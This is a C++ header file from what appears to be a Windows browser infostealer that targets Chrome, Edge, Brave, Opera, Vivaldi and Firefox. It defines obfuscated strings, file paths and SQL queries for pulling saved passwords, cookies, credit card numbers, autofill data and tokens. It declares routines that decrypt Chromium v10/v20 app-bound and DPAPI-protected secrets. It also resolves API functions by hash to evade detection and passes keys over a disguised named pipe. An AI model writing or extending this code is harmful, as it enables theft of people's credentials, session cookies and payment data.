#pragma once
#ifndef COMMON_H
#define COMMON_H

#include <Windows.h>
#include <shlwapi.h>
#include <strsafe.h>
#include <TlHelp32.h>
#include <Bcrypt.h>

#include "Debug.h"
#include "Obfuscate.hpp"
#include "Structures.h"

#pragma comment(lib, "shlwapi.lib")


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Browser Type Enum

typedef enum _BROWSER_TYPE
{
    BROWSER_UNKNOWN = -1,
    BROWSER_CHROME,
    BROWSER_BRAVE,
    BROWSER_EDGE,
    BROWSER_OPERA,
    BROWSER_OPERA_GX,
    BROWSER_VIVALDI,
    BROWSER_FIREFOX,

    BROWSER_COUNT,
} BROWSER_TYPE;

#define STR_CHROME_BRSR_NAME            OBFA_S("Chrome")
#define STR_BRAVE_BRSR_NAME             OBFA_S("Brave")
#define STR_EDGE_BRSR_NAME              OBFA_S("Msedge")
#define STR_EDGE_ALT_BRSR_NAME          OBFA_S("Edge")
#define STR_OPERA_BRSR_NAME             OBFA_S("Opera")
#define STR_OPERA_GX_BRSR_NAME          OBFA_S("OperaGX")
#define STR_OPERA_ALT_GX_BRSR_NAME      OBFA_S("Opera GX")
#define STR_VIVALDI_BRSR_NAME           OBFA_S("Vivaldi")
#define STR_FIREFOX_BRSR_NAME           OBFA_S("FireFox")
#define STR_UNKNOWN_BRSR_NAME           OBFA_S("Unknown")

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define STR_DLL_NAME                    OBFW_S(L"DllExtractChromiumSecrets.dll")

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define BUFFER_SIZE_08                  8
#define BUFFER_SIZE_14                  14
#define BUFFER_SIZE_16                  16
#define BUFFER_SIZE_20                  20
#define BUFFER_SIZE_24                  24
#define BUFFER_SIZE_32                  32
#define BUFFER_SIZE_64                  64
#define BUFFER_SIZE_128                 128
#define BUFFER_SIZE_256                 256
#define BUFFER_SIZE_512                 512
#define BUFFER_SIZE_1024                1024
#define BUFFER_SIZE_2048                2048
#define BUFFER_SIZE_4096                4096
#define BUFFER_SIZE_8192                8192

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define PACKET_SIG_APP_BOUND_KEY        'YKBA'
#define PACKET_SIG_DPAPI_KEY            'YKDP'
#define PACKET_SIG_COMPLETE             'ENOD'

#pragma pack(push, 1)
#pragma warning(push)
#pragma warning(disable: 4200)
typedef struct _DATA_PACKET
{
    DWORD       dwSignature;
    DWORD       dwDataSize;
    BYTE        bData[];
} DATA_PACKET, * PDATA_PACKET;
#pragma warning(pop)
#pragma pack(pop)

#define PACKET_SIZE(DATASIZE) (sizeof(DATA_PACKET) + (DATASIZE))

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// APPB
#define CRYPT_APPBOUND_KEY_PREFIX       'BPPA'
#define CRYPT_APPBOUND_KEY_PREFIX_LEN   4

// DPAPI 
#define CRYPT_DPAPI_KEY_PREFIX          'PAPD' // "DPAPI" as a DWORD
#define CRYPT_DPAPI_KEY_PREFIX_LEN      5

// AES
#define AES_GCM_TAG_SIZE                16
#define AES_GCM_IV_SIZE                 12

// V20
#define CHROMIUM_V20_PREFIX             '02v'
#define CHROMIUM_V20_PREFIX_SIZE        3

// V10
#define CHROMIUM_V10_PREFIX             '01v'
#define CHROMIUM_V10_PREFIX_SIZE        3

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define HAS_V10_PREFIX(D, L)            ((L) >= CHROMIUM_V10_PREFIX_SIZE && (((*(PDWORD)(D)) & 0x00FFFFFF) == CHROMIUM_V10_PREFIX))
#define HAS_V20_PREFIX(D, L)            ((L) >= CHROMIUM_V20_PREFIX_SIZE && (((*(PDWORD)(D)) & 0x00FFFFFF) == CHROMIUM_V20_PREFIX))

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// File paths

typedef enum _BROWSER_FILE_TYPE
{
    FILE_TYPE_WEB_DATA,
    FILE_TYPE_HISTORY,
    FILE_TYPE_COOKIES,
    FILE_TYPE_LOGIN_DATA,
    FILE_TYPE_BOOKMARKS,
    FILE_TYPE_LOCAL_STATE

} BROWSER_FILE_TYPE;


#define CHROME_BASE_PATH                OBFA_S("Google\\Chrome\\User Data")
#define BRAVE_BASE_PATH                 OBFA_S("BraveSoftware\\Brave-Browser\\User Data")
#define EDGE_BASE_PATH                  OBFA_S("Microsoft\\Edge\\User Data")
#define OPERA_BASE_PATH                 OBFA_S("Opera Software\\Opera Stable")
#define OPERAGX_BASE_PATH               OBFA_S("Opera Software\\Opera GX Stable")
#define VIVALDI_BASE_PATH               OBFA_S("Vivaldi\\User Data")

#define SUFFIX_WEB_DATA                 OBFA_S("\\Default\\Web Data")
#define SUFFIX_HISTORY                  OBFA_S("\\Default\\History")
#define SUFFIX_COOKIES                  OBFA_S("\\Default\\Network\\Cookies")
#define SUFFIX_LOGIN_DATA               OBFA_S("\\Default\\Login Data")
#define SUFFIX_BOOKMARKS                OBFA_S("\\Default\\Bookmarks")
#define SUFFIX_LOCAL_STATE              OBFA_S("\\Local State")


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// SQL Queries

#define SQLQUERY_TOKEN_SERVICE          OBFA_S("SELECT service, encrypted_token, binding_key FROM token_service;")
#define SQLQUERY_OPERA_ACCESS_TOKENS    OBFA_S("SELECT client_name, encoded_scopes, token, expiration_date FROM access_tokens;")
#define SQLQUERY_CREDIT_CARDS           OBFA_S("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, nickname, date_modified FROM credit_cards;")
#define SQLQUERY_AUTOFILL               OBFA_S("SELECT name, value, date_created, count FROM autofill;")
#define SQLQUERY_HISTORY                OBFA_S("SELECT url, title, visit_count, last_visit_time FROM urls;")
#define SQLQUERY_COOKIES                OBFA_S("SELECT host_key, path, name, expires_utc, encrypted_value FROM cookies;")
#define SQLQUERY_LOGINS                 OBFA_S("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins;")

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// Bookmarks
#define JSON_KEY_TYPE                   OBFA_S("\"type\"")
#define JSON_KEY_TYPE_LEN               6
#define JSON_KEY_NAME                   OBFA_S("\"name\"")
#define JSON_KEY_NAME_LEN               6
#define JSON_KEY_URL                    OBFA_S("\"url\"")
#define JSON_KEY_URL_LEN                5
#define JSON_VALUE_URL                  OBFA_S("url")
#define JSON_VALUE_URL_LEN              3

// Local State App Bound Encryption Key
#define JSON_PARENT_KEY                 OBFA_S("os_crypt")
#define JSON_CHILD_KEY                  OBFA_S("app_bound_encrypted_key")

// Local State Encryption Key (Used For V10 Secrets)
#define JSON_CHILD_KEY_V10              OBFA_S("encrypted_key")

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define PIPE_NAME_FRMT                  OBFA_S("\\\\.\\pipe\\%08X%08X")


static inline VOID GetPipeName(OUT LPSTR pszPipeName, IN DWORD dwSize)
{
    DWORD   dwState1    = 0x5EED1234,
            dwState2    = 0x00,
            dwSerial    = 0x00;

    GetVolumeInformationA("C:\\", NULL, 0, &dwSerial, NULL, NULL, NULL, 0);
    
    dwState1 ^= dwSerial;

    for (DWORD i = 0; i < BUFFER_SIZE_16; i++)
    {
        dwState1 ^= dwState1 << 13;
        dwState1 ^= dwState1 >> 17;
        dwState1 ^= dwState1 << 5;
    }

    dwState2 = dwState1;

    for (DWORD i = 0; i < BUFFER_SIZE_16; i++)
    {
        dwState2 ^= dwState2 << 13;
        dwState2 ^= dwState2 >> 17;
        dwState2 ^= dwState2 << 5;
    }

    StringCchPrintfA(pszPipeName, dwSize, PIPE_NAME_FRMT, dwState1, dwState2);
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define HEAP_FREE(ptr)                                      \
    do {                                                    \
        if (ptr) {                                          \
            HeapFree(GetProcessHeap(), 0, (LPVOID)ptr);     \
            ptr = NULL;                                     \
        }                                                   \
    } while (0)


#define HEAP_FREE_SECURE(ptr, size)                         \
    do {                                                    \
        if (ptr) {                                          \
            SecureZeroMemory((PVOID)ptr, size);             \
            HeapFree(GetProcessHeap(), 0, (LPVOID)ptr);     \
            ptr = NULL;                                     \
        }                                                   \
    } while (0)


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

LPSTR BytesToHexString(IN PBYTE pbData, IN DWORD cbData);

PBYTE DuplicateBuffer(IN PBYTE pbSrc, IN DWORD dwLen);

LPSTR DuplicateAnsiString(IN LPCSTR pszSrc);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL WriteFileToDiskA(IN LPCSTR pszFilePath, IN PBYTE pbFileBuffer, IN DWORD dwFileSize);

BOOL ReadFileFromDiskA(IN LPCSTR pszFilePath, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize);

LPSTR FindJsonStringValue(IN LPCSTR pszJson, IN DWORD cbJson, IN LPCSTR pszKey, OUT PDWORD pcbValue);

BOOL FindJsonIntValue(IN LPCSTR pszJson, IN LPCSTR pszKey, OUT PINT64 pllValue);

LPSTR FindJsonArrayValue(IN LPCSTR pszJson, IN DWORD cbJson, IN LPCSTR pszKey, OUT PDWORD pcbValue);

LPSTR FindNestedJsonValue(IN LPCSTR pszJson, IN DWORD cbJson, IN LPCSTR pszParentKey, IN LPCSTR pszChildKey, OUT PDWORD pcbValue);

LPSTR FindNestedJsonObject(IN LPCSTR pszJson, IN DWORD dwJson, IN LPCSTR pszKey, OUT PDWORD pdwObjectLen);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL DecryptDpapiBlob(IN PBYTE pBlob, IN DWORD dwBlob, OUT PBYTE* ppDecrypted, OUT PDWORD pcbDecrypted);

BOOL DecryptAesGcm(IN PBYTE pbKey, IN ULONG cbKey, IN PBYTE pbIv, IN ULONG cbIv, IN PBYTE pbCiphertext, IN ULONG cbCiphertext, IN PBYTE pbTag, IN ULONG cbTag, OUT PBYTE* ppbPlaintext, OUT PDWORD pcbPlaintext);

PBYTE Base64Decode(IN LPCSTR pszInput, IN DWORD cbInput, OUT PDWORD pcbOutput);

BOOL DecryptChromiumV10Secret(IN PBYTE pbKey, IN DWORD cbKey, IN PBYTE pbEncryptedSecret, IN DWORD cbEncryptedSecret, OUT PBYTE* ppbDecryptedSecret, OUT PDWORD pcbDecryptedSecret);

BOOL DecryptChromiumV20Secret(IN PBYTE pbKey, IN DWORD cbKey, IN PBYTE pbEncryptedSecret, IN DWORD cbEncryptedSecret, OUT PBYTE* ppbDecryptedSecret, OUT PDWORD pcbDecryptedSecret);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Getters

// Works For All Browsers
LPCSTR GetBrowserName(IN BROWSER_TYPE Browser);

// Works For All Browsers
LPCSTR GetBrowserProcessName(IN BROWSER_TYPE Browser);

// The following getter is Chromium-only because Firefox stores its data files
// inside a dynamic profile folder (e.g., Mozilla\Firefox\Profiles\xxxxxxxx.default-release\)
// that must be resolved at runtime

// Chromium Only
BOOL GetChromiumBrowserFilePath(IN BROWSER_TYPE Browser, IN BROWSER_FILE_TYPE FileType, OUT LPSTR pszBuffer, IN DWORD dwBufferSize);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

LPSTR GetBrowserDataFilePath(IN BROWSER_TYPE Browser, IN LPCSTR pszRelPath);

DWORD GetBrowserDataFilePathEx(IN BROWSER_TYPE Browser, IN LPCSTR* ppszRelPaths, IN DWORD dwFileCount);

VOID DeleteDataFilesCache();

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

FARPROC GetProcAddressH(IN HMODULE hModule, IN DWORD dwProcNameHash);

HMODULE GetModuleHandleH(IN DWORD dwModuleNameHash);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#pragma region HASH_VALUES

#define FNV1A_KERNEL32DLL                                    0xA3E6F6C3
#define FNV1A_NTDLLDLL                                       0xA62A3B3B

#define FNV1A_BASEPCONSTRUCTSXSCREATEPROCESSMESSAGE          0x98A84DB3
#define FNV1A_CSRCAPTUREMESSAGEMULTIUNICODESTRINGSINPLACE    0x58CC175A
#define FNV1A_CSRCLIENTCALLSERVER                            0x33C69D47

#define FNV1A_NTCREATEUSERPROCESS                            0x116893E9
#define FNV1A_RTLCREATEPROCESSPARAMETERSEX                   0x2DFC830F
#define FNV1A_RTLDESTROYPROCESSPARAMETERS                    0x552E48C2
#define FNV1A_NTCREATEDEBUGOBJECT                            0x22074A55
#define FNV1A_NTWAITFORDEBUGEVENT                            0xEECD8408
#define FNV1A_NTDEBUGCONTINUE                                0xED5F89F7
#define FNV1A_NTREMOVEPROCESSDEBUG                           0x81FB52CF
#define FNV1A_NTQUERYINFORMATIONPROCESS                      0xEA2DDA8A
#define FNV1A_NTQUERYSYSTEMINFORMATION                       0x7A43974A
#define FNV1A_NTREADVIRTUALMEMORY                            0x6E2A0391
#define FNV1A_NTWRITEVIRTUALMEMORY                           0x43E32F32
#define FNV1A_NTOPENPROCESSTOKEN                             0x1F1A92AD

#define FNV1A_BCRYPTOPENALGORITHMPROVIDER                    0x3E8576BD
#define FNV1A_BCRYPTCLOSEALGORITHMPROVIDER                   0xEF8885E7
#define FNV1A_BCRYPTSETPROPERTY                              0xACCF8FA8
#define FNV1A_BCRYPTGENERATESYMMETRICKEY                     0xCC7D94FA
#define FNV1A_BCRYPTDESTROYKEY                               0xDAD6B776
#define FNV1A_BCRYPTFINISHHASH                               0x886B9128
#define FNV1A_BCRYPTDESTROYHASH                              0xF5F0473F
#define FNV1A_BCRYPTHASHDATA                                 0xC6E130F7
#define FNV1A_BCRYPTCREATEHASH                               0x2EB40C97
#define FNV1A_BCRYPTDECRYPT                                  0xFB8806A0
#define FNV1A_BCRYPTDERIVEKEYPBKDF2                          0x83036F32
#define FNV1A_BCRYPTENCRYPT                                  0x3EA12744

#define FNV1A_REGOPENKEYEXW                                  0xFBF688C6
#define FNV1A_REGCLOSEKEY                                    0x1242154A
#define FNV1A_REGQUERYVALUEEXW                               0x7E27CF26

#define FNV1A_CRYPTSTRINGTOBINARYA                           0x6C40A739
#define FNV1A_CRYPTUNPROTECTDATA                             0xF5E65807

#define FNV1A_COSETPROXYBLANKET                              0x446E152E
#define FNV1A_COINITIALIZEEX                                 0x4CACFE40
#define FNV1A_COCREATEINSTANCE                               0xA1F07E4C
#define FNV1A_COUNINITIALIZE                                 0xA0F3063E

#pragma endregion

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef NTSTATUS (NTAPI* fnNtQuerySystemInformation)
(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    IN OUT PVOID                SystemInformation,
    IN ULONG                    SystemInformationLength,
    OUT PULONG                  ReturnLength OPTIONAL
);

// Shared dynamically resolved function pointers used by both the EXE and DLL projects.
// The EXE's DINMCLY_RSOLVD_FUNCTIONS inherits from this struct, so all shared
// members are accessible flat (without a nested accessor) in the EXE.
// Shared code should always access these through the g_pSharedFunctions pointer.

typedef struct _SHARED_RSOLVD_FUNCTIONS
{
    PVOID                                            pInitialized;

    // NTAPI
    fnNtQuerySystemInformation                       pNtQuerySystemInformation;

    // BCrypt Functions
    decltype(&BCryptOpenAlgorithmProvider)           pBCryptOpenAlgorithmProvider;
    decltype(&BCryptCloseAlgorithmProvider)          pBCryptCloseAlgorithmProvider;
    decltype(&BCryptSetProperty)                     pBCryptSetProperty;
    decltype(&BCryptGenerateSymmetricKey)            pBCryptGenerateSymmetricKey;
    decltype(&BCryptDestroyKey)                      pBCryptDestroyKey;
    decltype(&BCryptFinishHash)                      pBCryptFinishHash;
    decltype(&BCryptDestroyHash)                     pBCryptDestroyHash;
    decltype(&BCryptHashData)                        pBCryptHashData;
    decltype(&BCryptCreateHash)                      pBCryptCreateHash;
    decltype(&BCryptDecrypt)                         pBCryptDecrypt;
    decltype(&BCryptDeriveKeyPBKDF2)                 pBCryptDeriveKeyPBKDF2;
    decltype(&BCryptEncrypt)                         pBCryptEncrypt;

    // Crypt32 Functions
    decltype(&CryptStringToBinaryA)                  pCryptStringToBinaryA;
    decltype(&CryptUnprotectData)                    pCryptUnprotectData; // (dll only)

    // Ole32 Functions (dll only)
    decltype(&CoSetProxyBlanket)                     pCoSetProxyBlanket;
    decltype(&CoInitializeEx)                        pCoInitializeEx;
    decltype(&CoCreateInstance)                      pCoCreateInstance;
    decltype(&CoUninitialize)                        pCoUninitialize;

} SHARED_RSOLVD_FUNCTIONS, * PSHARED_RSOLVD_FUNCTIONS;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Global pointer to the shared functions struct.
// - In the DLL: points to a standalone SHARED_RSOLVD_FUNCTIONS instance
// - In the EXE: points to the base of DINMCLY_RSOLVD_FUNCTIONS (which inherits SHARED_RSOLVD_FUNCTIONS)
// All shared code must use g_pSharedFunctions-> to access resolved functions.

extern PSHARED_RSOLVD_FUNCTIONS g_pSharedFunctions;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#endif // !COMMON_H